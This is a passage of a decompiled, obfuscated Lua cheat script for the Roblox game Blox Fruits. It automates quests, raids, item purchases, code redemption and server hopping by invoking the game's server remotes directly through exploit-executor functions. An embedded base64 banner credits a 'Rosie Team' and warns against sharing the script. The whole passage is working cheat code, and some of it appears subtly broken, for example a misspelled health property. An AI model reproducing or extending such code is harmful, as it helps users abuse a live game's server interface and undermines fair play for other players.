    v146, v147 = v144(v145, v146)
    if v146 == nil then
        break
    end
    fruitprice[v147.Name] = v147.Price
end
function CheckMaterialCount(p148)
    local v149, v150, v151 = pairs(inv)
    while true do
        local v152
        v151, v152 = v149(v150, v151)
        if v151 == nil then
            break
        end
        if v152.Name == p148 then
            return v152.Count
        end
    end
    return 0
end
function luoiquanenskidxdxdxd()
    SkypieaPlayers = {}
    local v153, v154, v155 = pairs(game.Players:GetChildren())
    while true do
        local vu156
        v155, vu156 = v153(v154, v155)
        if v155 == nil then
            break
        end
        pcall(function()
            if vu156.Name ~= game.Players.LocalPlayer.Name and (game.Workspace.Characters:FindFirstChild(vu156.Name) and (vu156:FindFirstChild("Data") and (vu156.Data:FindFirstChild("Race") and vu156.Data.Race.Value == "Skypiea" and vu156.Character:FindFirstChild("Humanoid")))) then
                table.insert(SkypieaPlayers, vu156)
            end
        end)
    end
    return SkypieaPlayers
end
function get1mfruit()
    local v157, v158, v159 = pairs(inv)
    while true do
        local v160
        v159, v160 = v157(v158, v159)
        if v159 == nil then
            break
        end
        if v160.Type == "Blox Fruit" and (v160.Rarity == 3 or string.find(v160.Name, "Gravi")) then
            print("Get Fruit: " .. v160.Name)
            return v160.Name
        end
    end
    return false
end
function getRaidFruit()
    local v161, v162, v163 = pairs(inv)
    while true do
        local v164
        v163, v164 = v161(v162, v163)
        if v163 == nil then
            break
        end
        print(v164.Type)
        if v164.Name and (v164.Type == "Blox Fruit" and (v164.Rarity and (v164.Rarity == 0 or v164.Rarity == 1))) then
            print(v164.Name)
            raidfruit = v164.Name
            return v164.Name
        end
    end
end
function loadfruit(p165)
    if p165 then
        return game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("LoadFruit", p165)
    end
end
spawn(function()
    if c().Misc["Remove Terrain"] then
        local v166 = game
        local v167 = v166.Workspace
        local v168 = v166.Lighting
        local v169 = v167.Terrain
        v169.WaterWaveSize = 0
        v169.WaterWaveSpeed = 0
        v169.WaterReflectance = 0
        v169.WaterTransparency = 0
        v168.GlobalShadows = false
        v168.FogEnd = 9000000000
        v168.Brightness = 0
        settings().Rendering.QualityLevel = "Level01"
        All = # v166:GetDescendants()
        gay = 0
        local v170, v171, v172 = pairs(v166:GetDescendants())
        local v173 = true
        while true do
            local v174
            v172, v174 = v170(v171, v172)
            if v172 == nil then
                break
            end
            if v174:IsA("Part") or (v174:IsA("Union") or (v174:IsA("CornerWedgePart") or v174:IsA("TrussPart"))) then
                v174.Material = "Plastic"
                v174.Reflectance = 0
            elseif v174:IsA("Decal") or v174:IsA("Texture") and v173 then
                v174.Transparency = 1
            elseif v174:IsA("ParticleEmitter") or v174:IsA("Trail") then
                v174.Lifetime = NumberRange.new(0)
            elseif v174:IsA("Explosion") then
                v174.BlastPressure = 1
                v174.BlastRadius = 1
            elseif v174:IsA("Fire") or (v174:IsA("SpotLight") or (v174:IsA("Smoke") or v174:IsA("Sparkles"))) then
                v174.Enabled = false
            elseif v174:IsA("MeshPart") then
                v174.Material = "Plastic"
                v174.Reflectance = 0
                v174.TextureID = 1.0385902758728956e16
            end
        end
        local v175, v176, v177 = pairs(v168:GetChildren())
        while true do
            local v178
            v177, v178 = v175(v176, v177)
            if v177 == nil then
                break
            end
            if v178:IsA("BlurEffect") or (v178:IsA("SunRaysEffect") or (v178:IsA("ColorCorrectionEffect") or (v178:IsA("BloomEffect") or v178:IsA("DepthOfFieldEffect")))) then
                v178.Enabled = false
            end
        end
        game.ReplicatedStorage.Effect.Container.Hit:Destroy()
    end
end)

repeat
    if not wait() or game.Players.LocalPlayer.Team ~= nil then
        local vu179 = {}
        game:GetService("HttpService")
        local vu180 = "!Blacklist_Servers.json"
        function SaveSettings2()
            local v181 = game:GetService("HttpService")
            if not isfolder(".Genshin/utils/") then
                makefolder(".Genshin/utils/")
            end
            writefile(".Genshin/utils/" .. vu180, v181:JSONEncode(vu179))
        end
        function ReadSetting2()
            local v183, v184 = pcall(function()
                local v182 = game:GetService("HttpService")
                Hub = game:GetService("HttpService")
                if not isfolder(".Genshin/utils/") then
                    makefolder(".Genshin/utils/")
                end
                return v182:JSONDecode(readfile(".Genshin/utils/" .. vu180))
            end)
            if v183 then
                return v184
            end
            SaveSettings2()
            return ReadSetting2()
        end
        vu179 = ReadSetting2()
        function HopServer(p185)
            ticklon = tick()
            local vu186 = p185 or 10
            repeat
                task.wait()
            until tick() - ticklon >= 2
            local function v193()
                noti("Server Hop", 5)
                for v187 = 1, 100 do
                    if ChooseRegion == nil or ChooseRegion == "" then
                        ChooseRegion = "Singapore"
                    else
                        game:GetService("Players").LocalPlayer.PlayerGui.ServerBrowser.Frame.Filters.SearchRegion.TextBox.Text = ChooseRegion
                    end
                    local v188 = game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer(v187)
                    local v189, v190, v191 = pairs(v188)
                    while true do
                        local v192
                        v191, v192 = v189(v190, v191)
                        if v191 == nil then
                            break
                        end
                        if v191 ~= game.JobId and v192.Count < vu186 then
                            if not vu179[v191] or tick() - vu179[v191].Time > 600 then
                                vu179[v191] = {
                                    Time = tick()
                                }
                                SaveSettings2()
                                if game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Visible then
                                    noti("Wait For End InCombat", 15)
                                    wait()
                                    if game:GetService("Players").LocalPlayer then
                                        local _ = game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Visible
                                    end
                                end
                                game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer("teleport", v191)
                                return true
                            end
                            if tick() - vu179[v191].Time > 3600 then
                                vu179[v191] = nil
                            end
                        end
                    end
                end
                return false
            end
            if not getgenv().Loaded then
                local v194, v195, v196 = pairs(game.CoreGui.RobloxPromptGui.promptOverlay:GetChildren())
                local function v198(pu197)
                    if pu197.Name == "ErrorPrompt" then
                        if pu197.Visible and pu197.TitleFrame.ErrorTitle.Text == "Teleport Failed" then
                            HopServer()
                            pu197.Visible = false
                        end
                        pu197:GetPropertyChangedSignal("Visible"):Connect(function()
                            if pu197.Visible and pu197.TitleFrame.ErrorTitle.Text == "Teleport Failed" then
                                HopServer()
                                pu197.Visible = false
                            end
                        end)
                    end
                end
                while true do
                    local v199
                    v196, v199 = v194(v195, v196)
                    if v196 == nil then
                        break
                    end
                    v198(v199)
                end
                game.CoreGui.RobloxPromptGui.promptOverlay.ChildAdded:Connect(v198)
                getgenv().Loaded = true
            end
            while not v193() do
                wait()
            end
            SaveSettings2()
        end
        function getPlayerLevel()
            return vu8.Data.Level.Value
        end
        function getPlayerBeli()
            return vu8.Data.Beli.Value
        end
        function getPlayerFragments()
            return vu8.Data.Fragments.Value
        end
        function getPlayerHealth()
            return math.floor(vu9.Humanoid.Heath)
        end
        function IsIslandRaid(p200)
            if game:GetService("Workspace")._WorldOrigin.Locations:FindFirstChild("Island " .. p200) then
                min = 4500
                local v201, v202, v203 = pairs(game:GetService("Workspace")._WorldOrigin.Locations:GetChildren())
                while true do
                    local v204
                    v203, v204 = v201(v202, v203)
                    if v203 == nil then
                        break
                    end
                    if v204.Name == "Island " .. p200 and (v204.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < min then
                        min = (v204.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                    end
                end
                local v205, v206, v207 = pairs(game:GetService("Workspace")._WorldOrigin.Locations:GetChildren())
                while true do
                    local v208
                    v207, v208 = v205(v206, v207)
                    if v207 == nil then
                        break
                    end
                    if v208.Name == "Island " .. p200 and (v208.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= min then
                        return v208
                    end
                end
            end
        end
        function getNextIsland()
            TableIslandsRaid = {
                5,
                4,
                3,
                2,
                1
            }
            local v209, v210, v211 = pairs(TableIslandsRaid)
            while true do
                local v212
                v211, v212 = v209(v210, v211)
                if v211 == nil then
                    break
                end
                if IsIslandRaid(v212) and (IsIslandRaid(v212).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 4500 then
                    return IsIslandRaid(v212)
                end
            end
        end
        function checkIsHaveAllSkillsFruit()
            if game.Players.LocalPlayer.Data.DevilFruit.Value then
                if not game.Players.LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(game.Players.LocalPlayer.Data.DevilFruit.Value) then
                    repeat
                        wait()
                        equip("Blox Fruit")
                    until game.Players.LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(game.Players.LocalPlayer.Data.DevilFruit.Value)
                end
                return (not game.Players.LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(game.Players.LocalPlayer.Data.DevilFruit.Value):FindFirstChild("V") or game.Players.LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(game.Players.LocalPlayer.Data.DevilFruit.Value).V.Title.TextColor3 ~= Color3.fromRGB(114, 114, 114)) and (not game.Players.LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(game.Players.LocalPlayer.Data.DevilFruit.Value):FindFirstChild("C") or game.Players.LocalPlayer.PlayerGui.Main.Skills:FindFirstChild(game.Players.LocalPlayer.Data.DevilFruit.Value).C.Title.TextColor3 ~= Color3.fromRGB(114, 114, 114)) and true or false
            end
        end
        function CheckIsRaiding()
            checkraid1 = game.Players.LocalPlayer.PlayerGui.Main.Timer.Visible
            checkraid2 = getNextIsland()
            if checkraid1 then
                return checkraid1
            else
                return checkraid2
            end
        end
        function CheckDoubleQuest()
            local v213, v214, v215 = pairs(vu10)
            local v216 = {}
            while true do
                local v217
                v215, v217 = v213(v214, v215)
                if v215 == nil then
                    break
                end
                local v218, v219, v220 = pairs(v217)
                while true do
                    local v221
                    v220, v221 = v218(v219, v220)
                    if v220 == nil then
                        break
                    end
                    local _ = v221.LevelReq
                    local v222, v223, v224 = pairs(v221.Task)
                    while true do
                        local v225
                        v224, v225 = v222(v223, v224)
                        if v224 == nil then
                            break
                        end
                        if v224 == Mob1 then
                            local v226 = next
                            local v227 = v217
                            local v228 = nil
                            while true do
                                local v229
                                v228, v229 = v226(v217, v228)
                                if v228 == nil then
                                    break
                                end
                                if v229.LevelReq <= game.Players.LocalPlayer.Data.Level.Value and v229.Name ~= "Town Raid" then
                                    local v230 = next
                                    local v231 = v229.Task
                                    local v232 = nil
                                    while true do
                                        local v233
                                        v232, v233 = v230(v231, v232)
                                        if v232 == nil then
                                            break
                                        end
                                        if v233 > 1 then
                                            table.insert(v216, v232)
                                        end
                                    end
                                end
                            end
                            v217 = v227
                        end
                    end
                end
            end
            return v216
        end
        local vu234 = require(game.ReplicatedStorage:WaitForChild("GuideModule"))
        function CheckQuestData()
            local v235 = next
            local v236 = vu234.Data
            local v237 = nil
            while true do
                local v238
                v237, v238 = v235(v236, v237)
                if v237 == nil then
                    break
                end
                if v237 == "QuestData" then
                    return true
                end
            end
            return false
        end
        function CheckNameDoubleQuest()
            local v239 = nil
            if CheckQuestData() then
                local v240 = next
                local v241 = vu234.Data.QuestData.Task
                local v242 = nil
                while true do
                    local v243
                    v242, v243 = v240(v241, v242)
                    if v242 == nil then
                        break
                    end
                    v239 = v242
                end
            end
            return v239
        end
        function CheckNameDoubleQuest2()
            local v244 = {}
            if CheckQuestData() then
                local v245 = next
                local v246 = vu234.Data.QuestData.Task
                local v247 = nil
                while true do
                    local v248
                    v247, v248 = v245(v246, v247)
                    if v247 == nil then
                        break
                    end
                    table.insert(v244, v247)
                end
            end
            return v244
        end
        function CheckDoubleQuest2()
            checkq()
            local v249 = {}
            if game.Players.LocalPlayer.Data.Level.Value < 10 or (not CheckQuestData() or (CheckNameDoubleQuest() ~= Mob1 or # CheckNameDoubleQuest() <= 2)) then
                v249.Name = Mob1
                v249.NameQuest = Mob2
                v249.ID = Mob3
                return v249
            end
            local v250, v251, v252 = pairs(vu10)
            while true do
                local v253
                v252, v253 = v250(v251, v252)
                if v252 == nil then
                    break
                end
                local v254, v255, v256 = pairs(v253)
                local v257 = v252
                while true do
                    local v258
                    v256, v258 = v254(v255, v256)
                    if v256 == nil then
                        break
                    end
                    local v259, v260, v261 = pairs(v258.Task)
                    while true do
                        local v262
                        v261, v262 = v259(v260, v261)
                        if v261 == nil then
                            break
                        end
                        if tostring(v261) == Mob1 then
                            local v263 = next
                            local v264 = v253
                            local v265 = nil
                            while true do
                                local v266
                                v265, v266 = v263(v253, v265)
                                if v265 == nil then
                                    break
                                end
                                local v267 = next
                                local v268 = v266.Task
                                local v269 = v265
                                local v270 = nil
                                while true do
                                    local v271
                                    v270, v271 = v267(v268, v270)
                                    if v270 == nil then
                                        break
                                    end
                                    if v270 ~= Mob1 and 1 < v271 then
                                        if v266.LevelReq > game.Players.LocalPlayer.Data.Level.Value then
                                            v249.Name = Mob1
                                            v249.NameQuest = Mob2
                                            v249.ID = Mob3
                                        else
                                            v249.Name = tostring(v270)
                                            v249.NameQuest = v257
                                            v249.ID = v269
                                        end
                                        return v249
                                    end
                                end
                            end
                            v253 = v264
                        end
                    end
                end
            end
            v249.Name = Mob1
            v249.NameQuest = Mob2
            v249.ID = Mob3
            return v249
        end
        function moctui(p272)
            local v273 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "1")
            local v274 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Alchemist", "1")
            return game.Players.LocalPlayer.Character:FindFirstChild("RaceTransformed") and p272 == 4 and true or (v273 == - 2 and p272 == 3 and true or (v274 == - 2 and p272 == 2 and true or p272 == 1))
        end
        pcall(function()
        end)
        function getsortedmon()
            local vu275 = game.Players.LocalPlayer
            vu275.Character:WaitForChild("HumanoidRootPart")
            local v276 = workspace.Enemies:GetChildren()
            local v277, v278, v279 = pairs(v276)
            local v280 = {}
            while true do
                local v281
                v279, v281 = v277(v278, v279)
                if v279 == nil then
                    break
                end
                if v281.Name ~= "PirateBasic" and (v281.Name ~= "PirateBrigade" and v281:FindFirstChild("HumanoidRootPart")) then
                    table.insert(v280, v281)
                end
            end
            table.sort(v280, function(p282, p283)
                local v284 = vu275
                return vu275:DistanceFromCharacter(p282.HumanoidRootPart.Position) < v284:DistanceFromCharacter(p283.HumanoidRootPart.Position)
            end)
            return v280
        end
        function whatismyrace()
            return game:GetService("Players").LocalPlayer.Data.Race.Value
        end
        function MobLevel1OrMobLevel2()
            local v285, v286, v287 = pairs(getsortedmon())
            local v288 = {}
            while true do
                local v289
                v287, v289 = v285(v286, v287)
                if v287 == nil then
                    break
                end
                if not table.find(v288, v289.Name) and (v289:IsA("Model") and (v289.Name ~= "PirateBasic" and (not string.find(v289.Name, "Brigade") and (v289:FindFirstChild("Humanoid") and (v289.Humanoid.Health > 0 and v289:FindFirstChild("HumanoidRootPart")))))) then
                    table.insert(v288, v289.Name)
                end
            end
            local v290, v291, v292 = pairs(v288)
            while true do
                local v293
                v292, v293 = v290(v291, v292)
                if v292 == nil then
                    break
                end
                local v294 = tostring(v293:gsub(" %pLv. %d+%p", ""))
                if tostring(v294) == CheckNameDoubleQuest() then
                    return tostring(v293)
                end
            end
            return false
        end
        local vu295 = game.ReplicatedStorage.Remotes.CommF_
        raidlist = {}
        local v296, v297, v298 = pairs(require(game:GetService("ReplicatedStorage").Raids).advancedRaids)
        while true do
            local v299
            v298, v299 = v296(v297, v298)
            if v298 == nil then
                break
            end
            table.insert(raidlist, v299)
        end
        local v300, v301, v302 = pairs(require(game:GetService("ReplicatedStorage").Raids).raids)
        while true do
            local v303
            v302, v303 = v300(v301, v302)
            if v302 == nil then
                break
            end
            table.insert(raidlist, v303)
        end
        function getraidchip()
            local v304 = game.Players.LocalPlayer.Data.DevilFruit.Value
            local v305, v306, v307 = pairs(raidlist)
            while true do
                local v308
                v307, v308 = v305(v306, v307)
                if v307 == nil then
                    break
                end
                if string.find(v304, v308) then
                    return v308
                end
            end
            return "Dark"
        end
        function GetQuest()
            if game.Players.LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible then
                return
            elseif QuestPoint[tostring(CheckDoubleQuest2().NameQuest)] then
                if (QuestPoint[CheckDoubleQuest2().NameQuest].Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 8 then
                    QuestCFrame = QuestPoint[CheckDoubleQuest2().NameQuest]
                    to(QuestCFrame)
                else
                    vc = CheckDoubleQuest2()
                    vu295:InvokeServer("StartQuest", tostring(vc.NameQuest), vc.ID)
                    MobDual2 = vc.Name
                end
            else
                CFrameQuest()
            end
        end
        function checkNotify(p309)
            local v310 = string.lower(p309)
            local v311, v312, v313 = pairs(game.Players.LocalPlayer.PlayerGui.Notifications:GetDescendants())
            while true do
                local v314
                v313, v314 = v311(v312, v313)
                if v313 == nil then
                    break
                end
                if v314:IsA("TextLabel") and string.find(string.lower(v314.Text), v310) then
                    return true
                end
            end
        end
        local vu315 = 30
        local vu316 = 50
        local vu317 = 0
        y = 45
        function getKillVector3(p318)
            vu317 = vu317 + vu316
            return p318 + Vector3.new(math.sin(math.rad(vu317)) * vu315, y, math.cos(math.rad(vu317)) * vu315)
        end
        function autopoint()
            return (getPlayerLevel() <= 500 or not CheckSea(1)) and (getPlayerLevel() <= 2100 and (getPlayerLevel() <= 1800 and "Melee" or "Blox Fruit") or "Sword") or "Defense"
        end
        function GetAndCheckMeleeMastery(p319, _)
            mm = p319
            usingmelee = browhat[NameMelee()]
            momo = browhat[mm]
            if type(momo) ~= "string" then
                momo = momo()
            else
                momo = game.ReplicatedStorage.Remotes.CommF_:InvokeServer(momo, true) == 1
            end
            if momo then
                if not (game.Players.LocalPlayer.Character:FindFirstChild(mm) or game.Players.LocalPlayer.Backpack:FindFirstChild(mm)) then
                    momo = browhat[mm]
                    if type(momo) ~= "string" then
                        momo = momo()
                    else
                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer(momo, true)
                        momo = game.ReplicatedStorage.Remotes.CommF_:InvokeServer(momo)
                    end
                end
                if game.Players.LocalPlayer.Character:FindFirstChild(mm) or game.Players.LocalPlayer.Backpack:FindFirstChild(mm) then
                    kwekrwe = {
                        game.Players.LocalPlayer.Character,
                        game.Players.LocalPlayer.Backpack
                    }
                    local v320, v321, v322 = pairs(kwekrwe)
                    while true do
                        local v323
                        v322, v323 = v320(v321, v322)
                        if v322 == nil then
                            break
                        end
                        if v323:FindFirstChild(mm) then
                            return v323[mm].Level.Value
                        end
                    end
                end
            end
            return 0
        end
        function sh()
            if game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "1") == 0 then
                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "2")
            end
        end
        function getMeleeMastery()
            local vu324 = NameMelee(true)
            if vu324 and (vu324:FindFirstChild("Level") and meleetable3[vu324.Name]) then
                pcall(function()
                    vclui[vu324.Name] = "[+] : " .. vu324.Name
                end)
                eltrul[vu324.Name] = vu324.Level.Value
            end
        end
        function getFruitTier(pu325)
            spawn(function()
                print(": " .. pu325 .. " tier: " .. tostring(fruittier[pu325] or (fruittier[fruitMap[pu325] ] or 0)))
            end)
            return fruittier[pu325] or fruittier[fruitMap[pu325] ]
        end
        function buyMelee(pu326)
            if table.find(meleetable, pu326) then
                pcall(function()
                    game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", pu326, "2")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buy" .. pu326)
                end)
            end
        end
        function getMobLoadPos(p327)
            local v328, v329, v330 = pairs(game:GetService("Workspace")._WorldOrigin.EnemySpawns:GetChildren())
            while true do
                local v331
                v330, v331 = v328(v329, v330)
                if v330 == nil then
                    break
                end
                if v331.Name == p327 then
                    return v331.CFrame
                end
            end
            local v332, v333, v334 = pairs(getnilinstances())
            while true do
                local v335
                v334, v335 = v332(v333, v334)
                if v334 == nil then
                    break
                end
                if v335.Name and string.find(v335.Name, p327) then
                    return v335.CFrame or v335.HumanoidRootPart.CFrame
                end
            end
            local v336, v337, v338 = pairs(game.Workspace.Enemies:GetChildren())
            while true do
                local v339
                v338, v339 = v336(v337, v338)
                if v338 == nil then
                    break
                end
                if skidymf(v339) and (v339.Name and string.find(v339.Name, p327)) then
                    return v339.HumanoidRootPart.CFrame
                end
            end
            local v340, v341, v342 = pairs(game.ReplicatedStorage:GetChildren())
            while true do
                local v343
                v342, v343 = v340(v341, v342)
                if v342 == nil then
                    break
                end
                if skidymf(v343) and (v343.Name and string.find(v343.Name, p327)) then
                    return v343.HumanoidRootPart.CFrame or v343.CFrame
                end
            end
        end
        function checkq()
            local v344 = game.Players.LocalPlayer.Data.Level.Value
            local v345 = 0
            if 1450 <= v344 and game.PlaceId == 4442272183 then
                Mob1 = "Water Fighter"
                Mob2 = "ForgottenQuest"
                Mob3 = 2
            elseif 700 <= v344 and game.PlaceId == 2753915549 then
                Mob1 = "Galley Captain"
                Mob2 = "FountainQuest"
                Mob3 = 2
            elseif 1350 <= v344 and (not checkitem("Rengoku") and c().Process["Force Rengoku"]) then
                set1("Forcing Monster On Ice Castle For Rengoku")
                local v346 = math.random(1, 2)
                Mob2 = "FrostQuest"
                if v346 == 1 then
                    Mob1 = "Snow Lurker"
                    Mob3 = 2
                else
                    Mob1 = "Arctic Warrior"
                    Mob3 = 1
                end
            elseif 2050 <= v344 and (checkm2("DragonTalon") ~= 1 and (not checkMelee("DragonTalon") and eltrul["Electric Claw"] > 399)) then
                Mob1 = "Posessed Mummy"
                Mob2 = "HauntedQuest2"
                Mob3 = 2
            else
                local v347, v348, v349 = pairs(vu10)
                while true do
                    local v350
                    v349, v350 = v347(v348, v349)
                    if v349 == nil then
                        break
                    end
                    local v351, v352, v353 = pairs(v350)
                    local v354 = v349
                    while true do
                        local v355
                        v353, v355 = v351(v352, v353)
                        if v353 == nil then
                            break
                        end
                        local v356 = v355.LevelReq
                        local v357, v358, v359 = pairs(v355.Task)
                        local v360 = v353
                        while true do
                            local v361
                            v359, v361 = v357(v358, v359)
                            if v359 == nil then
                                break
                            end
                            if v356 <= v344 and (v345 <= v356 and (v355.Task[v359] > 1 and not table.find(vu15, tostring(v354)))) then
                                Mob1 = tostring(v359)
                                Mob2 = v354
                                Mob3 = v360
                                v345 = v356
                            end
                        end
                    end
                end
            end
        end
        function spamandwait(p362)
            taocanpasue = true
            local v363, v364, v365 = pairs(p362)
            while true do
                local v366
                v365, v366 = v363(v364, v365)
                if v365 == nil then
                    break
                end
                down(v366)
                repeat
                    wait(0.1)
                until not game.Players.LocalPlayer.Character.Busy.Value
            end
            taocanpasue = false
        end
        function stuff(p367)
            Buso()
            if p367 and (getPlayerLevel() > 2499 and (c().Process["Farm Fruit Mastery After Done Cdk Quest"] and (checkitem("Cursed Dual Katana") and (skidymf(p367) and (p367.Humanoid.Health / p367.Humanoid.MaxHealth * 100 < 65 and not checkIsHaveAllSkillsFruit()))))) then
                dmlockskill = monmon.HumanoidRootPart.Position
                equip("Blox Fruit")
                spamandwait({
                    "Z",
                    "X",
                    "C",
                    "V",
                    "F"
                })
            end
            dmlockskill = false
            equip(forcewp or "Melee")
        end
        local v380 = (function(p368)
            local v369 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
            local v370 = {}
            for v371 = 1, # v369 do
                v370[v369:sub(v371, v371)] = v371 - 1
            end
            local v372 = string.sub(p368, - 2) == "==" and 2 or (string.sub(p368, - 1) == "=" and 1 or 0)
            local v373 = {}
            for v374 = 1, # p368 - v372, 4 do
                local v375, v376, v377, v378 = string.byte(p368, v374, v374 + 3)
                local v379 = v370[string.char(v375)] * 262144 + v370[string.char(v376)] * 4096 + v370[string.char(v377)] * 64 + v370[string.char(v378)]
                table.insert(v373, string.char(v379 / 65536))
                table.insert(v373, string.char(v379 / 256 % 256))
                table.insert(v373, string.char(v379 % 256))
            end
            for _ = 1, v372 do
                table.remove(v373)
            end
            return table.concat(v373)
        end)("Q2jDoG8gTeG7q25nIELhuqFuIMSQw6MgxJDhur9uDQogICAgICAgICAgICAgICAvJCQkJCQkJCAgICAgICAgICAgICAgICAgICAgICAvJCQgICAgICAgICAgICAgICAgIC8kJCQkJCQkJCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgfCAkJF9fICAkJCAgICAgICAgICAgICAgICAgICAgfF9fLyAgICAgICAgICAgICAgICB8X18gICQkX18vICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICB8ICQkICBcICQkICAvJCQkJCQkICAgLyQkJCQkJCQgLyQkICAvJCQkJCQkICAgICAgICAgIHwgJCQgIC8kJCQkJCQgICAvJCQkJCQkICAvJCQkJCQkLyQkJCQgDQogICAgICAgICAgICAgIHwgJCQkJCQkJC8gLyQkX18gICQkIC8kJF9fX19fL3wgJCQgLyQkX18gICQkICAgICAgICAgfCAkJCAvJCRfXyAgJCQgfF9fX18gICQkfCAkJF8gICQkXyAgJCQNCiAgICAgICAgICAgICAgfCAkJF9fICAkJHwgJCQgIFwgJCR8ICAkJCQkJCQgfCAkJHwgJCQkJCQkJCQgICAgICAgICB8ICQkfCAkJCQkJCQkJCAgLyQkJCQkJCR8ICQkIFwgJCQgXCAkJA0KICAgICAgICAgICAgICB8ICQkICBcICQkfCAkJCAgfCAkJCBcX19fXyAgJCR8ICQkfCAkJF9fX19fLyAgICAgICAgIHwgJCR8ICQkX19fX18vIC8kJF9fICAkJHwgJCQgfCAkJCB8ICQkDQogICAgICAgICAgICAgIHwgJCQgIHwgJCR8ICAkJCQkJCQvIC8kJCQkJCQkL3wgJCR8ICAkJCQkJCQkICAgICAgICAgfCAkJHwgICQkJCQkJCR8ICAkJCQkJCQkfCAkJCB8ICQkIHwgJCQNCiAgICAgICAgICAgICAgfF9fLyAgfF9fLyBcX19fX19fLyB8X19fX19fXy8gfF9fLyBcX19fX19fXy8gICAgICAgICB8X18vIFxfX19fX19fLyBcX19fX19fXy98X18vIHxfXy8gfF9fLyAgICAgICAgICAgICAgICANCiAgICAgIFsrXSBSb3NpZSBUZWFtIEPhuqNtIMagbiBC4bqhbiDEkMOjIFRpbiBUxrDhu59uZyBWw6AgU+G7rSBE4bulbmcgROG7i2NoIFbhu6UgQ+G7p2EgQ2jDum5nIFTDtGksIE7hur91IFRo4bqleSBI4buvdSDDjXQgSMOjeSBDaGlhIFPhursgQ2hvIELhuqFuIELDqCBD4bunYSBC4bqhbiAhIQ0KICAgICAgWytdIEtow7RuZyDEkMaw4bujYyBTaGFyZSBIYXkgQ3JhY2sgTcOjIE5ndeG7k24gTsOgeSBDaG8gQWkhIE7hur91IEtow7RuZyBC4bqhbiBT4bq9IELhu4sgQmFuIElQIEto4buPaSBXZWJzaXRlIFbEqW5oIFZp4buFbiENCiAgICAgIFsrXSBDaMO6bmcgVMO0aSBLaMO0bmcgTmjhuq1uIEjhu5cgVHLhu6MgTmjhu69uZyBNw6MgTmd14buTbiBNaeG7hW4gUGjDrSwgWGluIMSQ4burbmcgQuG6o28gVsOsIFNhby4gVOG6oW8gVGlja2V0IEjhu5cgVHLhu6MgQ+G7p2EgV2Vic2l0ZSBU4bqhaTogaHR0cHM6Ly9yb3NpZXRlYW0ubmV0L2Rhc2gvdGlja2V0DQogICAgICBbK10gIE7hur91IELhuqFuIEVkaXQgU291cmNlIFbDoCBVcCBXZWIgU2hhcmUgTmjhu5sgT2JmdXNjYXRlIFNjcmlwdC4gTuG6v3UgQuG6oW4gQ8OzIFRp4buBbiBUaMOsIFPhu60gROG7pW5nOiBMdXJhLlBoLCBMdWFybW9yLk5ldCB8IE7hur91IELhuqFuIEtow7RuZyBDw7MgVGnhu4FuIFRow6wgRMO5bmc6IGx1YW9iZnVzY2F0ZS5jb20sIE1vb25TZWMsIDc3RnVzY2F0ZSwuLi4gTmjDqSENCl1d")
        warn(v380)
        function Buso()
            if not game.Players.LocalPlayer.Character:FindFirstChild("HasBuso") then
                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Buso")
            end
        end
        function getmon(p381)
            return game.Workspace.Enemies:FindFirstChild(p381)
        end
        function throughcheck(p382, p383, p384)
            local v385, v386, v387 = pairs(p382)
            while true do
                local v388
                v387, v388 = v385(v386, v387)
                if v387 == nil then
                    break
                end
                print(v387, v388)
                lmao = v387
                if p383 == 1 then
                    lmao = V
                end
                print(lmao)
                if p384(lmao) then
                    return p384(lmao)
                end
            end
            return false
        end
        function RedeemAllCodesX2()
            CodesX2 = {
                "Sub2CaptainMaui",
                "CODE_SERVICIO",
                "CINCODEMAYO_BOOST",
                "15B_BESTBROTHERS",
                "DEVSCOOKING",
                "GAMERROBOT_YT",
                "ADMINGIVEAWAY",
                "GAMER_ROBOT_1M",
                "TY_FOR_WATCHING",
                "kittgaming",
                "Sub2Fer999",
                "Enyu_is_Pro",
                "Magicbus",
                "JCWK",
                "Starcodeheo",
                "Bluxxy",
                "fudd10_v2",
                "FUDD10",
                "BIGNEWS",
                "THEGREATACE",
                "SUB2GAMERROBOT_EXP1",
                "Sub2OfficialNoobie",
                "StrawHatMaine",
                "SUB2NOOBMASTER123",
                "Sub2Daigrock",
                "Axiore",
                "TantaiGaming"
            }
            local v389, v390, v391 = pairs(CodesX2)
            while true do
                local v392
                v391, v392 = v389(v390, v391)
                if v391 == nil then
                    break
                end
                game:GetService("ReplicatedStorage").Remotes.Redeem:InvokeServer(v392)
            end
        end
        function CheckQuestBoss(p393)
            local v394
            if string.find(p393, " %pRaid Boss%p") then
                local v395 = string.gsub(p393, "%pLv. %d+%p", "")
                v394 = string.gsub(v395, "  %pRaid Boss%p", "")
            else
                local v396 = string.gsub(p393, "%pLv. %d+%p", "")
                v394 = string.gsub(v396, "  %pBoss%p", "")
            end
            local v397 = next
            local v398, v399 = require(game:GetService("ReplicatedStorage").Quests)
            while true do
                local v400
                v399, v400 = v397(v398, v399)
                if v399 == nil then
                    break
                end
